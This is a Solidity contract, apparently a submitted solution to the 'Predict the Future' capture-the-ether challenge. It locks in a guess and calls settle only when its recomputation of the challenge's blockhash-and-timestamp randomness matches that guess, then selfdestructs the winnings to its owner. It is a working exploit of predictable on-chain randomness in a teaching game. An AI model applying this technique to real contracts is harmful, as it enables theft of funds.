/**
 *Submitted for verification at Etherscan.io on 2022-04-28
*/

pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    function isComplete() public view returns (bool);

    function lockInGuess(uint8 n) public payable;

    function settle() public;
}

contract PredictTheFutureAnswer {
    address owner;
    PredictTheFutureChallenge challenge;
    
    constructor(address challengeAddress) public {
        owner = msg.sender;
        challenge = PredictTheFutureChallenge(challengeAddress);
        require(!challenge.isComplete());
    }
    
    function lockIt() public payable {
        require(msg.value == 1 ether);
        challenge.lockInGuess.value(msg.value)(7);
    }
    
    function settleIfOk() public {
        uint8 currentAnswer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        if (currentAnswer == 7) {
            challenge.settle();
        }
    }
    
    function () public payable {}
    
    function getIt() public {
        require(challenge.isComplete());
        selfdestruct(owner);
    }
}